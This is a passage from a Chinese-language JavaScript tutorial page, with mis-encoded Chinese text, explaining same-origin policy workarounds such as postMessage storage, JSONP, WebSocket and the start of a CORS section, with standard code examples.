punctuation">.</span>contentWindow<span class="token punctuation">;</span>
<span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">&#39;Jack&#39;</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token comment">// å­˜å…¥å¯¹è±¡</span>
win<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span>
  <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token literal-property property">key</span><span class="token operator">:</span> <span class="token string">&#39;storage&#39;</span><span class="token punctuation">,</span> <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">&#39;set&#39;</span><span class="token punctuation">,</span> <span class="token literal-property property">data</span><span class="token operator">:</span> obj<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
  <span class="token string">&#39;http://bbb.com&#39;</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// è¯»å–å¯¹è±¡</span>
win<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span>
  <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token literal-property property">key</span><span class="token operator">:</span> <span class="token string">&#39;storage&#39;</span><span class="token punctuation">,</span> <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">&quot;get&quot;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
  <span class="token string">&quot;*&quot;</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
window<span class="token punctuation">.</span><span class="token function-variable function">onmessage</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token punctuation">.</span>origin <span class="token operator">!=</span> <span class="token string">&#39;http://aaa.com&#39;</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="ajax" tabindex="-1"><a class="header-anchor" href="#ajax" aria-hidden="true">#</a> AJAX</h3><p>åŒæºæ”¿ç­–è§„å®šï¼ŒAJAX è¯·æ±‚åªèƒ½å‘ç»™åŒæºçš„ç½‘å€ï¼Œå¦åˆ™å°±æŠ¥é”™ã€‚</p><p>é™¤äº†æ¶è®¾æœåŠ¡å™¨ä»£ç†ï¼ˆæµè§ˆå™¨è¯·æ±‚åŒæºæœåŠ¡å™¨ï¼Œå†ç”±åè€…è¯·æ±‚å¤–éƒ¨æœåŠ¡ï¼‰ï¼Œæœ‰ä¸‰ç§æ–¹æ³•è§„é¿è¿™ä¸ªé™åˆ¶ã€‚</p><blockquote><ul><li>JSONP</li><li>WebSocket</li><li>CORS</li></ul></blockquote><h4 id="jsonp" tabindex="-1"><a class="header-anchor" href="#jsonp" aria-hidden="true">#</a> JSONP</h4><p>JSONP æ˜¯æœåŠ¡å™¨ä¸å®¢æˆ·ç«¯è·¨æºé€šä¿¡çš„å¸¸ç”¨æ–¹æ³•ã€‚æœ€å¤§ç‰¹ç‚¹å°±æ˜¯ç®€å•æ˜“ç”¨ï¼Œæ²¡æœ‰å…¼å®¹æ€§é—®é¢˜ï¼Œè€å¼æµè§ˆå™¨å…¨éƒ¨æ”¯æŒï¼ŒæœåŠ¡ç«¯æ”¹é€ éå¸¸å°ã€‚</p><p>å®ƒçš„åšæ³•å¦‚ä¸‹ã€‚</p><p>ç¬¬ä¸€æ­¥ï¼Œç½‘é¡µæ·»åŠ ä¸€ä¸ª<code>&lt;script&gt;</code>å…ƒç´ ï¼Œå‘æœåŠ¡å™¨è¯·æ±‚ä¸€ä¸ªè„šæœ¬ï¼Œè¿™ä¸å—åŒæºæ”¿ç­–é™åˆ¶ï¼Œå¯ä»¥è·¨åŸŸè¯·æ±‚ã€‚</p><div class="language-html" data-ext="html"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>http://api.foo.com?callback=bar<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p>æ³¨æ„ï¼Œè¯·æ±‚çš„è„šæœ¬ç½‘å€æœ‰ä¸€ä¸ª<code>callback</code>å‚æ•°ï¼ˆ<code>?callback=bar</code>ï¼‰ï¼Œç”¨æ¥å‘Šè¯‰æœåŠ¡å™¨ï¼Œå®¢æˆ·ç«¯çš„å›è°ƒå‡½æ•°åç§°ï¼ˆ<code>bar</code>ï¼‰ã€‚</p><p>ç¬¬äºŒæ­¥ï¼ŒæœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚åï¼Œæ‹¼æ¥ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå°† JSON æ•°æ®æ”¾åœ¨å‡½æ•°åé‡Œé¢ï¼Œä½œä¸ºå­—ç¬¦ä¸²è¿”å›ï¼ˆ<code>bar({...})</code>ï¼‰ã€‚</p><p>ç¬¬ä¸‰æ­¥ï¼Œå®¢æˆ·ç«¯ä¼šå°†æœåŠ¡å™¨è¿”å›çš„å­—ç¬¦ä¸²ï¼Œä½œä¸ºä»£ç è§£æï¼Œå› ä¸ºæµè§ˆå™¨è®¤ä¸ºï¼Œè¿™æ˜¯<code>&lt;script&gt;</code>æ ‡ç­¾è¯·æ±‚çš„è„šæœ¬å†…å®¹ã€‚è¿™æ—¶ï¼Œå®¢æˆ·ç«¯åªè¦å®šä¹‰äº†<code>bar()</code>å‡½æ•°ï¼Œå°±èƒ½åœ¨è¯¥å‡½æ•°ä½“å†…ï¼Œæ‹¿åˆ°æœåŠ¡å™¨è¿”å›çš„ JSON æ•°æ®ã€‚</p><p>ä¸‹é¢çœ‹ä¸€ä¸ªå®ä¾‹ã€‚é¦–å…ˆï¼Œç½‘é¡µåŠ¨æ€æ’å…¥<code>&lt;script&gt;</code>å…ƒç´ ï¼Œç”±å®ƒå‘è·¨åŸŸç½‘å€å‘å‡ºè¯·æ±‚ã€‚</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>function addScriptTag(src) {
  var script = document.createElement(&#39;script&#39;);
  script.setAttribute(&#39;type&#39;, &#39;text/javascript&#39;);
  script.src = src;
  document.body.appendChild(script);
}

window.onload = function () {
  addScriptTag(&#39;http://example.com/ip?callback=foo&#39;);
}

function foo(data) {
  console.log(&#39;Your public IP address is: &#39; + data.ip);
};
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>ä¸Šé¢ä»£ç é€šè¿‡åŠ¨æ€æ·»åŠ <code>&lt;script&gt;</code>å…ƒç´ ï¼Œå‘æœåŠ¡å™¨<code>example.com</code>å‘å‡ºè¯·æ±‚ã€‚æ³¨æ„ï¼Œè¯¥è¯·æ±‚çš„æŸ¥è¯¢å­—ç¬¦ä¸²æœ‰ä¸€ä¸ª<code>callback</code>å‚æ•°ï¼Œç”¨æ¥æŒ‡å®šå›è°ƒå‡½æ•°çš„åå­—ï¼Œè¿™å¯¹äº JSONP æ˜¯å¿…éœ€çš„ã€‚</p><p>æœåŠ¡å™¨æ”¶åˆ°è¿™ä¸ªè¯·æ±‚ä»¥åï¼Œä¼šå°†æ•°æ®æ”¾åœ¨å›è°ƒå‡½æ•°çš„å‚æ•°ä½ç½®è¿”å›ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code><span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  <span class="token string-property property">&#39;ip&#39;</span><span class="token operator">:</span> <span class="token string">&#39;8.8.8.8&#39;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><p>ç”±äº<code>&lt;script&gt;</code>å…ƒç´ è¯·æ±‚çš„è„šæœ¬ï¼Œç›´æ¥ä½œä¸ºä»£ç è¿è¡Œã€‚è¿™æ—¶ï¼Œåªè¦æµè§ˆå™¨å®šä¹‰äº†<code>foo</code>å‡½æ•°ï¼Œè¯¥å‡½æ•°å°±ä¼šç«‹å³è°ƒç”¨ã€‚ä½œä¸ºå‚æ•°çš„ JSON æ•°æ®è¢«è§†ä¸º JavaScript å¯¹è±¡ï¼Œè€Œä¸æ˜¯å­—ç¬¦ä¸²ï¼Œå› æ­¤é¿å…äº†ä½¿ç”¨<code>JSON.parse</code>çš„æ­¥éª¤ã€‚</p><h4 id="websocket" tabindex="-1"><a class="header-anchor" href="#websocket" aria-hidden="true">#</a> WebSocket</h4><p>WebSocket æ˜¯ä¸€ç§é€šä¿¡åè®®ï¼Œä½¿ç”¨<code>ws://</code>ï¼ˆéåŠ å¯†ï¼‰å’Œ<code>wss://</code>ï¼ˆåŠ å¯†ï¼‰ä½œä¸ºåè®®å‰ç¼€ã€‚è¯¥åè®®ä¸å®è¡ŒåŒæºæ”¿ç­–ï¼Œåªè¦æœåŠ¡å™¨æ”¯æŒï¼Œå°±å¯ä»¥é€šè¿‡å®ƒè¿›è¡Œè·¨æºé€šä¿¡ã€‚</p><p>ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ï¼Œæµè§ˆå™¨å‘å‡ºçš„ WebSocket è¯·æ±‚çš„å¤´ä¿¡æ¯ï¼ˆæ‘˜è‡ª<a href="https://en.wikipedia.org/wiki/WebSocket" target="_blank" rel="noopener noreferrer">ç»´åŸºç™¾ç§‘<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a>ï¼‰ã€‚</p><div class="language-text" data-ext="text"><pre class="language-text"><code>GET /chat HTTP/1.1
Host: server.example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==
Sec-WebSocket-Protocol: chat, superchat
Sec-WebSocket-Version: 13
Origin: http://example.com
</code></pre></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œæœ‰ä¸€ä¸ªå­—æ®µæ˜¯<code>Origin</code>ï¼Œè¡¨ç¤ºè¯¥è¯·æ±‚çš„è¯·æ±‚æºï¼ˆoriginï¼‰ï¼Œå³å‘è‡ªå“ªä¸ªåŸŸåã€‚</p><p>æ­£æ˜¯å› ä¸ºæœ‰äº†<code>Origin</code>è¿™ä¸ªå­—æ®µï¼Œæ‰€ä»¥ WebSocket æ‰æ²¡æœ‰å®è¡ŒåŒæºæ”¿ç­–ã€‚å› ä¸ºæœåŠ¡å™¨å¯ä»¥æ ¹æ®è¿™ä¸ªå­—æ®µï¼Œåˆ¤æ–­æ˜¯å¦è®¸å¯æœ¬æ¬¡é€šä¿¡ã€‚å¦‚æœè¯¥åŸŸååœ¨ç™½åå•å†…ï¼ŒæœåŠ¡å™¨å°±ä¼šåšå‡ºå¦‚ä¸‹å›åº”ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code><span class="token constant">HTTP</span><span class="token operator">/</span><span class="token number">1.1</span> <span class="token number">101</span> Switching Protocols
<span class="token literal-property property">Upgrade</span><span class="token operator">:</span> websocket
<span class="token literal-property property">Connection</span><span class="token operator">:</span> Upgrade
Sec<span class="token operator">-</span>WebSocket<span class="token operator">-</span>Accept<span class="token operator">:</span> HSmrc0sMlYUkAGmm5OPpG2HaGWk<span class="token operator">=</span>
Sec<span class="token operator">-</span>WebSocket<span class="token operator">-</span>Protocol<span class="token operator">:</span> chat
</code></pre></div><h4 id="cors" tabindex="-1"><a class="header-anchor" href="#cors" aria-hidden="true">#</a> CORS</h4><p>CORS æ˜¯è·¨æºèµ„æºåˆ†äº«ï¼ˆCross-Origin Resource Sharingï¼‰çš„ç¼©å†™ã€‚å®ƒæ˜¯ W3C æ ‡å‡†ï¼Œå±äºè·¨æº AJAX è¯·æ±‚çš„æ ¹æœ¬è§£å†³æ–¹æ³•ã€‚ç›¸æ¯” JSONP åªèƒ½å‘<code>GET</code>è¯·æ±‚ï¼ŒCORS å…è®¸ä»»ä½•ç±»å‹çš„è¯·æ±‚ã€‚</p></div><!----><footer class="page-meta"><div class="meta-item edit-link"><a href="https://github.com/HarryXiong24/HarryXiong24.github.io/edit/main/src/zh/front-end/advanced-js/jses23.md" rel="noopener noreferrer" target="_blank" aria-label="ç¼–è¾‘æ­¤é¡µ" class="nav-link label"><!--[--><svg xmlns="http://www.w3.org/2000/svg" class="icon edit-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="edit icon"><path d="M430.818 653.65a60.46 60.46 0 0 1-50.96-93.281l71.69-114.012 7.773-10.365L816.038 80.138A60.46 60.46 0 0 1 859.225 62a60.46 60.46 0 0 1 43.186 18.138l43.186 43.186a60.46 60.46 0 0 1 0 86.373L588.879 565.55l-8.637 8.637-117.466 68.234a60.46 60.46 0 0 1-31.958 11.229z"></path><path d="M728.802 962H252.891A190.883 190.883 0 0 1 62.008 771.98V296.934a190.883 190.883 0 0 1 190.883-192.61h267.754a60.46 60.46 0 0 1 0 120.92H252.891a69.962 69.962 0 0 0-69.098 69.099V771.98a69.962 69.962 0 0 0 69.098 69.098h475.911A69.962 69.962 0 0 0 797.9 771.98V503.363a60.46 60.46 0 1 1 120.922 0V771.98A190.883 190.883 0 0 1 728.802 962z"></path></svg><!--]-->ç¼–è¾‘æ­¤é¡µ<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span><!----></a></div><div class="meta-item git-info"><div class="update-time"><span class="label">ä¸Šæ¬¡ç¼–è¾‘äº: </span><!----></div><div class="contributors"><span class="label">è´¡çŒ®è€…: </span><!--[--><!--[--><span class="contributor" title="email: harryxiong24@gmail.com">harryxiong24</span><!--]--><!--]--></div></div></footer><nav class="vp-page-nav"><a href="/zh/front-end/advanced-js/jses22.html" class="nav-link prev" aria-label="22.DOMäº‹ä»¶"><div class="hint"><span class="arrow start"></span>ä¸Šä¸€é¡µ</div><div class="link"><span class="font-icon icon iconfont icon-js" style=""></span>22.DOMäº‹ä»¶</div></a><a href="/zh/front-end/advanced-js/jses24.html" class="nav-link next" aria-label="24.ç¼–ç¨‹é£æ ¼"><div class="hint">ä¸‹ä¸€é¡µ<span class="arrow end"></span></div><div class="link">24.ç¼–ç¨‹é£æ ¼<span class="font-icon icon iconfont icon-js" style=""></span></div></a></nav><div id="comment" class="waline-wrapper" darkmode="false" style="display:block;"><div data-waline provider="Waline"><!--v-if--><div class="wl-comment"><!--v-if--><div class="wl-panel"><div class="wl-header item3"><!--[--><div class="wl-header-item"><label for="wl-nick">æ˜µç§°</label><input id="wl-nick" class="wl-input wl-nick" name="nick" type="text" value></div><div class="wl-header-item"><label for="wl-mail">é‚®ç®±</label><input id="wl-mail" class="wl-input wl-mail" name="mail" type="email" value></div><div class="wl-header-item"><label for="wl-link">ç½‘å€</label><input id="wl-link" class="wl-input wl-link" name="link" type="text" value></div><!--]--></div><textarea id="wl-edit" class="wl-editor" placeholder="è¯·ç•™è¨€ã€‚(å¡«å†™é‚®ç®±å¯åœ¨è¢«å›å¤æ—¶æ”¶åˆ°é‚®ä»¶æé†’)"></textarea><div class="wl-preview" style="display:none;"><hr><h4>é¢„è§ˆ:</h4><div class="wl-content"></div></div><div class="wl-footer"><div class="wl-actions"><a href="https://guides.github.com/features/mastering-markdown/" title="Markdown Guide" aria-label="Markdown is supported" class="wl-action" target="_blank" rel="noopener noreferrer"><svg width="16" height="16" ariaHidden="true"><path d="M14.85 3H1.15C.52 3 0 3.52 0 4.15v7.69C0 12.48.52 13 1.15 13h13.69c.64 0 1.15-.52 1.15-1.15v-7.7C16 3.52 15.48 3 14.85 3zM9 11H7V8L5.5 9.92 4 8v3H2V5h2l1.5 2L7 5h2v6zm2.99.5L9.5 8H11V5h2v3h1.5l-2.51 3.5z" fill="currentColor"></path></svg></a><button type="button" class="wl-action" title="è¡¨æƒ…" style="display:none;"><svg viewBox="0 0 1024 1024" width="24" height="24"><path d="M563.2 463.3 677 540c1.7 1.2 3.7 1.8 5.8 1.8.7 0 1.4-.1 2-.2 2.7-.5 5.1-2.1 6.6-4.4l25.3-37.8c1.5-2.3 2.1-5.1 1.6-7.8s-2.1-5.1-4.4-6.6l-73.6-49.1 73.6-49.1c2.3-1.5 3.9-3.9 4.4-6.6.5-2.7 0-5.5-1.6-7.8l-25.3-37.8a10.1 10.1 0 0 0-6.6-4.4c-.7-.1-1.3-.2-2-.2-2.1 0-4.1.6-5.8 1.8l-113.8 76.6c-9.2 6.2-14.7 16.4-14.7 27.5.1 11 5.5 21.3 14.7 27.4zM387 348.8h-45.5c-5.7 0-10.4 4.7-10.4 10.4v153.3c0 5.7 4.7 10.4 10.4 10.4H387c5.7 0 10.4-4.7 10.4-10.4V359.2c0-5.7-4.7-10.4-10.4-10.4zm333.8 241.3-41-20a10.3 10.3 0 0 0-8.1-.5c-2.6.9-4.8 2.9-5.9 5.4-30.1 64.9-93.1 109.1-164.4 115.2-5.7.5-9.9 5.5-9.5 11.2l3.9 45.5c.5 5.3 5 9.5 10.3 9.5h.9c94.8-8 178.5-66.5 218.6-152.7 2.4-5 .3-11.2-4.8-13.6zm186-186.1c-11.9-42-30.5-81.4-55.2-117.1-24.1-34.9-53.5-65.6-87.5-91.2-33.9-25.6-71.5-45.5-111.6-59.2-41.2-14-84.1-21.1-127.8-21.1h-1.2c-75.4 0-148.8 21.4-212.5 61.7-63.7 40.3-114.3 97.6-146.5 165.8-32.2 68.1-44.3 143.6-35.1 218.4 9.3 74.8 39.4 145 87.3 203.3.1.2.3.3.4.5l36.2 38.4c1.1 1.2 2.5 2.1 3.9 2.6 73.3 66.7 168.2 103.5 267.5 103.5 73.3 0 145.2-20.3 207.7-58.7 37.3-22.9 70.3-51.5 98.1-85 27.1-32.7 48.7-69.5 64.2-109.1 15.5-39.7 24.4-81.3 26.6-123.8 2.4-43.6-2.5-87-14.5-129zm-60.5 181.1c-8.3 37-22.8 72-43 104-19.7 31.1-44.3 58.6-73.1 81.7-28.8 23.1-61 41-95.7 53.4-35.6 12.7-72.9 19.1-110.9 19.1-82.6 0-161.7-30.6-222.8-86.2l-34.1-35.8c-23.9-29.3-42.4-62.2-55.1-97.7-12.4-34.7-18.8-71-19.2-107.9-.4-36.9 5.4-73.3 17.1-108.2 12-35.8 30-69.2 53.4-99.1 31.7-40.4 71.1-72 117.2-94.1 44.5-21.3 94-32.6 143.4-32.6 49.3 0 97 10.8 141.8 32 34.3 16.3 65.3 38.1 92 64.8 26.1 26 47.5 56 63.6 89.2 16.2 33.2 26.6 68.5 31 105.1 4.6 37.5 2.7 75.3-5.6 112.3z" fill="currentColor"></path></svg></button><button type="button" class="wl-action" title="è¡¨æƒ…åŒ…"><svg width="24" height="24" fill="currentcolor" viewBox="0 0 24 24"><path style="transform: translateY(0.5px)" d="M18.968 10.5H15.968V11.484H17.984V12.984H15.968V15H14.468V9H18.968V10.5V10.5ZM8.984 9C9.26533 9 9.49967 9.09367 9.687 9.281C9.87433 9.46833 9.968 9.70267 9.968 9.984V10.5H6.499V13.5H8.468V12H9.968V14.016C9.968 14.2973 9.87433 14.5317 9.687 14.719C9.49967 14.9063 9.26533 15 8.984 15H5.984C5.70267 15 5.46833 14.9063 5.281 14.719C5.09367 14.5317 5 14.2973 5 14.016V9.985C5 9.70367 5.09367 9.46933 5.281 9.282C5.46833 9.09467 5.70267 9.001 5.984 9.001H8.984V9ZM11.468 9H12.968V15H11.468V9V9Z"></path><path d="M18.5 3H5.75C3.6875 3 2 4.6875 2 6.75V18C2 20.0625 3.6875 21.75 5.75 21.75H18.5C20.5625 21.75 22.25 20.0625 22.25 18V6.75C22.25 4.6875 20.5625 3 18.5 3ZM20.75 18C20.75 19.2375 19.7375 20.25 18.5 20.25H5.75C4.5125 20.25 3.5 19.2375 3.5 18V6.75C3.5 5.5125 4.5125 4.5 5.75 4.5H18.5C19.7375 4.5 20.75 5.5125 20.75 6.75V18Z"></path></svg></button><input id="wl-image-upload" class="upload" type="file" accept=".png,.jpg,.jpeg,.webp,.bmp,.gif"><label for="wl-image-upload" class="wl-action" title="ä¸Šä¼ å›¾ç‰‡"><svg viewBox="0 0 1024 1024" width="24" height="24"><path d="M784 112H240c-88 0-160 72-160 160v480c0 88 72 160 160 160h544c88 0 160-72 160-160V272c0-88-72-160-160-160zm96 640c0 52.8-43.2 96-96 96H240c-52.8 0-96-43.2-96-96V272c0-52.8 43.2-96 96-96h544c52.8 0 96 43.2 96 96v480z" fill="currentColor"></path><path d="M352 480c52.8 0 96-43.2 96-96s-43.2-96-96-96-96 43.2-96 96 43.2 96 96 96zm0-128c17.6 0 32 14.4 32 32s-14.4 32-32 32-32-14.4-32-32 14.4-32 32-32zm462.4 379.2-3.2-3.2-177.6-177.6c-25.6-25.6-65.6-25.6-91.2 0l-80 80-36.8-36.8c-25.6-25.6-65.6-25.6-91.2 0L200 728c-4.8 6.4-8 14.4-8 24 0 17.6 14.4 32 32 32 9.6 0 16-3.2 22.4-9.6L380.8 640l134.4 134.4c6.4 6.4 14.4 9.6 24 9.6 17.6 0 32-14.4 32-32 0-9.6-4.8-17.6-9.6-24l-52.8-52.8 80-80L769.6 776c6.4 4.8 12.8 8 20.8 8 17.6 0 32-14.4 32-32 0-8-3.2-16-8-20.8z" fill="currentColor"></path></svg></label><button type="button" class="wl-action" title="é¢„è§ˆ"><svg viewBox="0 0 1024 1024" width="24" height="24"><path d="M710.816 654.301c70.323-96.639 61.084-230.578-23.705-314.843-46.098-46.098-107.183-71.109-172.28-71.109-65.008 0-126.092 25.444-172.28 71.109-45.227 46.098-70.756 107.183-70.756 172.106 0 64.923 25.444 126.007 71.194 172.106 46.099 46.098 107.184 71.109 172.28 71.109 51.414 0 100.648-16.212 142.824-47.404l126.53 126.006c7.058 7.06 16.297 10.979 26.406 10.979 10.105 0 19.343-3.919 26.402-10.979 14.467-14.467 14.467-38.172 0-52.723L710.816 654.301zm-315.107-23.265c-65.88-65.88-65.88-172.54 0-238.42 32.069-32.07 74.245-49.149 119.471-49.149 45.227 0 87.407 17.603 119.472 49.149 65.88 65.879 65.88 172.539 0 238.42-63.612 63.178-175.242 63.178-238.943 0zm0 0" fill="currentColor"></path><path d="M703.319 121.603H321.03c-109.8 0-199.469 89.146-199.469 199.38v382.034c0 109.796 89.236 199.38 199.469 199.38h207.397c20.653 0 37.384-16.645 37.384-37.299 0-20.649-16.731-37.296-37.384-37.296H321.03c-68.582 0-124.352-55.77-124.352-124.267V321.421c0-68.496 55.77-124.267 124.352-124.267h382.289c68.582 0 124.352 55.771 124.352 124.267V524.72c0 20.654 16.736 37.299 37.385 37.299 20.654 0 37.384-16.645 37.384-37.299V320.549c-.085-109.8-89.321-198.946-199.121-198.946zm0 0" fill="currentColor"></path></svg></button></div><div class="wl-info"><div class="wl-captcha-container"></div><div class="wl-text-number">0 <!--v-if--> Â å­—</div><button type="button" class="wl-btn">ç™»å½•</button><button type="submit" class="primary wl-btn" title="Cmd|Ctrl + Enter"><!--[-->æäº¤<!--]--></button></div><div class="wl-gif-popup"><input type="text" placeholder="æœç´¢è¡¨æƒ…åŒ…"><!--v-if--><div class="wl-loading"><svg width="30" height="30" viewBox="0 0 100 100" preserveAspectRatio="xMidYMid"><circle cx="50" cy="50" fill="none" stroke="currentColor" strokeWidth="4" r="40" stroke-dasharray="85 30"><animateTransform attributeName="transform" type="rotate" repeatCount="indefinite" dur="1s" values="0 50 50;360 50 50" keyTimes="0;1"></animateTransform></circle></svg></div></div><div class="wl-emoji-popup"><!--[--><!--]--><!--v-if--></div></div></div><!--v-if--></div><div class="wl-meta-head"><div class="wl-count"><!--v-if--> è¯„è®º</div><ul class="wl-sort"><!--[--><li class="active">æŒ‰æ­£åº</li><li class="">æŒ‰å€’åº</li><li class="">æŒ‰çƒ­åº¦</li><!--]--></ul></div><div class="wl-cards"><!--[--><!--]--></div><!--[--><div class="wl-loading"><svg width="30" height="30" viewBox="0 0 100 100" preserveAspectRatio="xMidYMid"><circle cx="50" cy="50" fill="none" stroke="currentColor" strokeWidth="4" r="40" stroke-dasharray="85 30"><animateTransform attributeName="transform" type="rotate" repeatCount="indefinite" dur="1s" values="0 50 50;360 50 50" keyTimes="0;1"></animateTransform></circle></svg></div><!--]--><div class="wl-power"> Powered by <a href="https://github.com/walinejs/waline" target="_blank" rel="noopener noreferrer"> Waline </a> v2.15.5</div></div></div><!----><!--]--></main><!--]--><footer class="vp-footer-wrapper"><!----><!----></footer></div><!--]--><!--]--><!----><!--]--></div>
    <script type="module" src="/assets/app-79d257de.js" defer></script>
  </body>
</html>
